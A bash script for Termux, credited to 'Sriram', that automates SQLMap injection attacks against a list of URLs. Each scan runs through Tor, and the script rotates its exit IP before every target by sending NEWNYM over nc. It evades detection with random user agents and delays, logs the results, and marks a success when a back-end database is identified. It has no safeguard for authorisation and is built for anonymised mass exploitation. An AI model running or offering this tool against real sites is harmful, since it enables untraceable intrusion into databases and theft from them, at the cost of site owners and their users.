#!/data/data/com.termux/files/usr/bin/bash

# Colors
GREEN="\033[1;32m"
RED="\033[1;31m"
YELLOW="\033[1;33m"
BLUE="\033[1;34m"
RESET="\033[0m"

echo -e "${GREEN}🛡️ SQLMap via Tor Auto-Runner with IP Rotate, Crawl, Delay, and Logging${RESET}"

# Check and start Tor
if ! pgrep -x tor > /dev/null; then
    echo -e "${YELLOW}[+] Starting Tor service...${RESET}"
    tor & sleep 5
else
    echo -e "${GREEN}[✓] Tor is already running${RESET}"
fi

# Ask for URL list file
read -p "📁 Enter URL list file (one URL per line): " url_file
[[ ! -f "$url_file" ]] && echo -e "${RED}[!] File not found${RESET}" && exit 1

# Extra SQLMap options
read -p "⚙️ Extra SQLMap options (e.g. --dbs --crawl=2 --level=3), or press Enter to skip: " extra_options

# Create logs folder
mkdir -p logs

# Count total
total=$(grep -cve '^\s*$' "$url_file")
count=0

# Loop through URLs
while IFS= read -r url; do
    [[ -z "$url" ]] && continue
    count=$((count+1))
    echo -e "\n${YELLOW}[${count}/${total}]🔍 Scanning: ${url}${RESET}"

    # Rotate IP via NEWNYM
    echo -e "${BLUE}🔄 Requesting new Tor IP...${RESET}"
    (echo -e 'AUTHENTICATE ""\nSIGNAL NEWNYM\nQUIT') | nc 127.0.0.1 9051 > /dev/null
    sleep 5

    # Check IP
    ip_before=$(torsocks curl -s https://ifconfig.me)
    echo -e "➡️  IP before scan: ${BLUE}$ip_before${RESET}"

    # Setup log name
    log_name=$(echo "$url" | sed 's|https\?://||; s|[/?=&]|_|g')
    log_file="logs/${log_name}.log"

    # Start SQLMap
    echo -e "${BLUE}🚀 Running SQLMap...${RESET}"
    start_time=$(date +%s)

    torsocks timeout 300 python3 sqlmap/sqlmap.py -u "$url" \
        --random-agent \
        --delay=3 \
        --timeout=25 \
        --retries=2 \
        --batch \
        --tor --tor-type=SOCKS5 \
        --tor-port=9050 \
        --tor-control-port=9051 \
        $extra_options 2>&1 | tee "$log_file"

    exit_code=$?

    # Time calc
    end_time=$(date +%s)
    duration=$((end_time - start_time))
    delay=$((duration / 2 + 5))

    # Check result
    if grep -q "\[INFO\] the back-end DBMS is" "$log_file"; then
        echo -e "${GREEN}✅ Exploit success${RESET}"
    elif [[ $exit_code -eq 124 ]]; then
        echo -e "${RED}⏱️ Timed out — skipping${RESET}"
    elif grep -q "connection refused" "$log_file"; then
        echo -e "${RED}❌ Connection failed — skipping${RESET}"
    else
        echo -e "${YELLOW}⚠️ Scan completed (check logs)${RESET}"
    fi

    # IP after
    ip_after=$(torsocks curl -s https://ifconfig.me)
    echo -e "⬅️  IP after scan: ${BLUE}$ip_after${RESET}"
    echo -e "📝 Saved to: ${log_file}"

    echo "---------------------------------------------"
    echo -e "${YELLOW}⏳ Waiting ${delay}s before next...${RESET}"
    sleep $delay

done < "$url_file"

# 🔐 Encrypted & coded by Sriram
